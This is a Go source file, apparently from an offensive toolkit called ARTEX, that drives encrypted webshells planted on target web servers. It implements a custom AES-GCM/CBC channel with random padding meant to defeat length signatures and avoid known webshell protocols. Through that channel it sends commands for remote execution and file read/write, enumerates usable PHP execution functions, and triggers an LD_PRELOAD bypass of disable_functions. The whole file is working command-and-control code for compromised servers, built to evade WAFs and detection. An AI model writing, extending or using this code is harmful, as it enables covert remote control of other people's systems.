// http_shell_enc.go 是自研加密马(phpenc/jspenc)会话驱动,期 1a 的分层扩展:
// 本文件只实现「传输加密包装」,明文 payload 构造(哨兵/函数降级/引号规避/分块)
// 完全复用期 1a 的构造器——HTTPShell.post 内的 enc 分支把同一段 payload 改走
// 加密通道。加密马的 PHP 执行面与期 1a 一致:目标侧 eval PHP 代码段。
//
// 协议(自研,与哥斯拉/冰蝎等公开 webshell 平台协议无关,请求/响应同构):
//
//	请求体(裸 POST body)= base64( nonce || ciphertext || tag )
//	明文帧 = padLen(1B) || 随机填充(0~64B) || JSON
//	请求 JSON: {"op":"exec|probe|read|write", ...};字段值恒为 base64/hex/枚举
//	响应 JSON: {"ok":bool,"out":...,"err":...,"mode":"gcm|cbc"}
//
// 加密:AES-256-GCM(nonce 12B/tag 16B)优先;目标 PHP 无 GCM 时马体运行时降级
// AES-256-CBC + HMAC-SHA256(encrypt-then-MAC,iv 16B/mac 32B,先验 MAC 再解密)。
// 模式由首个加密探针双向锁存:驱动先试 gcm,认证失败再试 cbc,成功即记住并落库
// (Secret.EncMode),后续请求单发不重试(exec 有副作用,不做双发尝试)。
// 密钥:马体生成时 crypto/rand 32B,每会话独立;nonce 每请求随机。
package session

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

const (
	encGCMNonce = 12 // GCM nonce 长度
	encGCMTag   = 16 // GCM tag 长度
	encCBCIV    = 16 // CBC iv 长度
	encCBCMAC   = 32 // CBC 路径 HMAC-SHA256 长度
	encMaxPad   = 64 // 随机填充上限(0~64B,杀长度签名)
)

// encCryptoError 标记「认证/解密层」失败(tag/HMAC 不符、帧非法):只有这类错误
// 才允许模式重试(gcm↔cbc);HTTP/base64 类错误直接上报,语义不混淆。
type encCryptoError struct{ msg string }

func (e *encCryptoError) Error() string { return e.msg }

// encRequest 是请求明文 JSON。Code 恒为 payload 的 base64(协议约定字段值无引号
// 反斜杠,目标侧无 JSON 库也可朴素解析)。
type encRequest struct {
	Op   string `json:"op"`
	Code string `json:"code,omitempty"`
	S    string `json:"s,omitempty"`
	Path string `json:"path,omitempty"`
	Data string `json:"data,omitempty"`
	App  string `json:"app,omitempty"`
}

// encResponse 是响应明文 JSON。exec/read 的 Out 是输出的 base64;probe 的 Out 是
// 对端回显的探针随机串。
type encResponse struct {
	OK   bool   `json:"ok"`
	Out  string `json:"out"`
	Err  string `json:"err"`
	Mode string `json:"mode"`
}

// encTransport 是加密马的传输层:frame → seal → POST → open → unframe。
type encTransport struct {
	url    string
	key    []byte
	client *http.Client

	mu   sync.RWMutex
	mode string // "" 未锁存;"gcm" / "cbc"
}

// Mode 返回已锁存的加密模式(未锁存为空)。
func (t *encTransport) Mode() string {
	t.mu.RLock()
	defer t.mu.RUnlock()
	return t.mode
}

// SetMode 恢复落库的模式(进程重启后免重探)。
func (t *encTransport) SetMode(m string) {
	if m != "gcm" && m != "cbc" {
		return
	}
	t.mu.Lock()
	t.mode = m
	t.mu.Unlock()
}

// ---------------- 加解密原语(驱动与测试模拟马共用) ----------------

// encSubKey 派生 CBC 路径子密钥:sha256(key || 域分隔串)。
func encSubKey(key []byte, domain string) []byte {
	h := sha256.New()
	h.Write(key)
	h.Write([]byte(domain))
	return h.Sum(nil)
}

// encFrame 加随机填充帧:padLen(1B) || 随机填充(0~64B) || payload。
func encFrame(payload []byte) []byte {
	var b [1]byte
	_, _ = rand.Read(b[:])
	n := int(b[0]) % (encMaxPad + 1)
	f := make([]byte, 1+n+len(payload))
	f[0] = byte(n)
	_, _ = rand.Read(f[1 : 1+n])
	copy(f[1+n:], payload)
	return f
}

// encUnframe 剥帧:校验填充长度,返回 payload。
func encUnframe(f []byte) ([]byte, error) {
	if len(f) < 1 {
		return nil, &encCryptoError{"明文帧为空"}
	}
	n := int(f[0])
	if len(f) < 1+n {
		return nil, &encCryptoError{"明文帧非法:填充长度越界"}
	}
	return f[1+n:], nil
}

// pkcs7Pad / pkcs7Unpad 与 openssl 默认 PKCS7 填充一致。
func pkcs7Pad(p []byte, block int) []byte {
	n := block - len(p)%block
	out := make([]byte, len(p)+n)
	copy(out, p)
	for i := len(p); i < len(out); i++ {
		out[i] = byte(n)
	}
	return out
}

func pkcs7Unpad(p []byte, block int) ([]byte, error) {
	if len(p) == 0 || len(p)%block != 0 {
		return nil, &encCryptoError{"CBC 明文长度非块整数倍"}
	}
	n := int(p[len(p)-1])
	if n < 1 || n > block || n > len(p) {
		return nil, &encCryptoError{"CBC 填充非法"}
	}
	for i := len(p) - n; i < len(p); i++ {
		if int(p[i]) != n {
			return nil, &encCryptoError{"CBC 填充字节不符"}
		}
	}
	return p[:len(p)-n], nil
}

// encCrypt 加密一帧(不含填充帧构造):返回 nonce/iv || ciphertext || tag/mac。
func encCrypt(key []byte, mode string, frame []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	switch mode {
	case "gcm":
		g, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
		nonce := make([]byte, encGCMNonce)
		_, _ = rand.Read(nonce)
		return g.Seal(nonce, nonce, frame, nil), nil
	case "cbc":
		iv := make([]byte, encCBCIV)
		_, _ = rand.Read(iv)
		padded := pkcs7Pad(frame, aes.BlockSize)
		ct := make([]byte, len(padded))
		cipher.NewCBCEncrypter(block, iv).CryptBlocks(ct, padded)
		mac := hmac.New(sha256.New, encSubKey(key, "artex-mac-v1"))
		mac.Write(iv)
		mac.Write(ct)
		out := make([]byte, 0, len(iv)+len(ct)+encCBCMAC)
		out = append(out, iv...)
		out = append(out, ct...)
		return append(out, mac.Sum(nil)...), nil
	}
	return nil, opError("http", "未知加密模式 %q", mode)
}

// encDecrypt 解密一帧(encCrypt 镜像):GCM 验 tag;CBC 先验 HMAC 再解密。
func encDecrypt(key []byte, mode string, blob []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	switch mode {
	case "gcm":
		if len(blob) < encGCMNonce+encGCMTag+1 {
			return nil, &encCryptoError{"密文帧过短(GCM)"}
		}
		g, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
		pt, err := g.Open(nil, blob[:encGCMNonce], blob[encGCMNonce:], nil)
		if err != nil {
			return nil, &encCryptoError{"响应认证失败(tag 不符):响应被篡改或密钥/模式不匹配"}
		}
		return pt, nil
	case "cbc":
		if len(blob) < encCBCIV+encCBCMAC+aes.BlockSize {
			return nil, &encCryptoError{"密文帧过短(CBC)"}
		}
		iv := blob[:encCBCIV]
		ct := blob[encCBCIV : len(blob)-encCBCMAC]
		mac := blob[len(blob)-encCBCMAC:]
		m := hmac.New(sha256.New, encSubKey(key, "artex-mac-v1"))
		m.Write(iv)
		m.Write(ct)
		if !hmac.Equal(mac, m.Sum(nil)) {
			return nil, &encCryptoError{"响应认证失败(HMAC 不符):响应被篡改或密钥/模式不匹配"}
		}
		if len(ct)%aes.BlockSize != 0 {
			return nil, &encCryptoError{"CBC 密文长度非块整数倍"}
		}
		pt := make([]byte, len(ct))
		cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, ct)
		return pkcs7Unpad(pt, aes.BlockSize)
	}
	return nil, opError("http", "未知加密模式 %q", mode)
}

// ---------------- 传输 ----------------

// doOnce 发一次加密请求并解响应。错误分层:网络/HTTP/非 base64 直接上报;
// tag/HMAC/帧失败包成 *encCryptoError(供模式重试判定)。
func (t *encTransport) doOnce(ctx context.Context, req encRequest, mode string, timeout time.Duration) (*encResponse, error) {
	payload, err := json.Marshal(req)
	if err != nil {
		return nil, opError("http", "请求 JSON 序列化失败: %v", err)
	}
	blob, err := encCrypt(t.key, mode, encFrame(payload))
	if err != nil {
		return nil, err
	}
	if timeout <= 0 {
		timeout = defaultHTTPTimeout
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	hreq, err := http.NewRequestWithContext(ctx, http.MethodPost, t.url,
		strings.NewReader(base64.StdEncoding.EncodeToString(blob)))
	if err != nil {
		return nil, opError("http", "构造请求失败: %v", err)
	}
	hreq.Header.Set("Content-Type", "text/plain")
	hreq.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
	resp, err := t.client.Do(hreq)
	if err != nil {
		return nil, opError("http", "HTTP 请求失败（目标不可达/超时/连接重置）: %v", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
	if err != nil {
		return nil, opError("http", "读取响应失败: %v", err)
	}
	if resp.StatusCode == http.StatusNotFound {
		return nil, opError("http", "加密马不存在（HTTP 404):马体可能已被删除/路径错误")
	}
	if resp.StatusCode >= 400 {
		return nil, opError("http", "目标返回 HTTP %d（马可能被删除/被 WAF 拦截）: %s",
			resp.StatusCode, excerpt(string(body), 200))
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
	if err != nil {
		return nil, opError("http", "响应非 base64 密文：疑似 WAF 拦截页/马体失效（非本协议端点）。回显摘要: %q",
			excerpt(string(body), 200))
	}
	pt, err := encDecrypt(t.key, mode, raw)
	if err != nil {
		return nil, err // *encCryptoError
	}
	frame, err := encUnframe(pt)
	if err != nil {
		return nil, err // *encCryptoError
	}
	var er encResponse
	if err := json.Unmarshal(frame, &er); err != nil {
		return nil, opError("http", "密文解密成功但响应 JSON 非法（马体版本不匹配？): %v", err)
	}
	return &er, nil
}

// do 按锁存模式发请求;未锁存时先试 gcm、认证失败再试 cbc,成功即锁存。
// 锁存后单发不重试(exec 有副作用,不双发）。
func (t *encTransport) do(ctx context.Context, req encRequest, timeout time.Duration) (*encResponse, error) {
	if m := t.Mode(); m != "" {
		return t.doOnce(ctx, req, m, timeout)
	}
	var lastErr error
	for _, m := range []string{"gcm", "cbc"} {
		resp, err := t.doOnce(ctx, req, m, timeout)
		if err == nil {
			t.SetMode(m)
			return resp, nil
		}
		var ce *encCryptoError
		if !errors.As(err, &ce) {
			return nil, err // 非认证层错误不做模式重试
		}
		lastErr = err
	}
	return nil, lastErr
}

// exec 是 HTTPShell.post 的加密分支入口:op=exec,code 为 payload 的 base64。
func (t *encTransport) exec(ctx context.Context, code string, timeout time.Duration) (string, error) {
	resp, err := t.do(ctx, encRequest{Op: "exec", Code: b64e([]byte(code))}, timeout)
	if err != nil {
		return "", err
	}
	if !resp.OK {
		return "", opError("exec", "加密马目标侧执行失败: %s", resp.Err)
	}
	out, err := base64.StdEncoding.DecodeString(resp.Out)
	if err != nil {
		return "", opError("exec", "响应 out base64 解码失败（马体版本不匹配）: %v", err)
	}
	return string(out), nil
}

// probe 是加密探针（Test 用）:op=probe 回显随机串，同时完成模式锁存。
func (t *encTransport) probe(ctx context.Context, timeout time.Duration) error {
	var b [8]byte
	_, _ = rand.Read(b[:])
	s := hex.EncodeToString(b[:])
	resp, err := t.do(ctx, encRequest{Op: "probe", S: s}, timeout)
	if err != nil {
		return err
	}
	if !resp.OK {
		return opError("test", "加密马探针被拒绝: %s", resp.Err)
	}
	if resp.Out != s {
		return opError("test", "加密马探针回显不符（密钥不匹配或非本协议马体）")
	}
	return nil
}

// ---------------- 会话构造 ----------------

// NewEncShell 构造加密马会话。lang 接受 php/jsp/phpenc/jspenc;keyB64 是
// generate_webshell 返回的 key(base64 32B)。password 对加密马无意义。
func NewEncShell(shellURL, lang, keyB64 string) (*HTTPShell, error) {
	lang = strings.ToLower(strings.TrimSpace(lang))
	lang = strings.TrimSuffix(lang, "enc") // phpenc→php
	key, err := base64.StdEncoding.DecodeString(strings.TrimSpace(keyB64))
	if err != nil || len(key) != 32 {
		return nil, opError("probe", "加密马密钥必须是 base64 编码的 32 字节（generate_webshell 返回的 key_b64)")
	}
	s, err := NewHTTPShell(shellURL, "cmd", lang)
	if err != nil {
		return nil, err
	}
	s.kind = "http_" + lang + "enc"
	s.enc = &encTransport{url: s.url, key: key, client: s.client}
	return s, nil
}

// ProbeEnc 探测加密马:加密探针（op=probe）锁存模式;phpenc 再经加密通道枚举
// 可用执行函数（复用期 1a 探针 payload)。失败返回带语义错误，不伪造成功。
func ProbeEnc(ctx context.Context, shellURL, lang, keyB64 string) (*HTTPShell, ProbeInfo, error) {
	s, err := NewEncShell(shellURL, lang, keyB64)
	if err != nil {
		return nil, ProbeInfo{}, err
	}
	if err := s.Test(ctx); err != nil { // enc 分支:op=probe 加密探针
		return nil, ProbeInfo{}, err
	}
	info := ProbeInfo{Kind: s.kind, Lang: s.lang + "enc", Platform: s.platform, Variant: "eval"}
	if s.lang == "php" {
		caps, err := s.probePHPCaps(ctx)
		if err != nil {
			return nil, info, err
		}
		info.Funcs = caps.funcs
		info.Mail, info.Putenv = caps.mail, caps.putenv
		s.SetFuncs(caps.funcs)
		s.mailOK, s.putenvOK = caps.mail, caps.putenv
		if len(caps.funcs) == 0 {
			info.DisableFunctions = true
			s.disableFuncs = true
			// 与明文 PHP eval 马同一套内建 LD_PRELOAD 绕过探测（经加密通道投递/触发）。
			if caps.mail && caps.putenv {
				s.probeBypass(ctx, &info)
			} else {
				info.BypassNote = "mail()/putenv() 不全可用，LD_PRELOAD 绕过前提不满足"
			}
		}
	}
	return s, info, nil
}
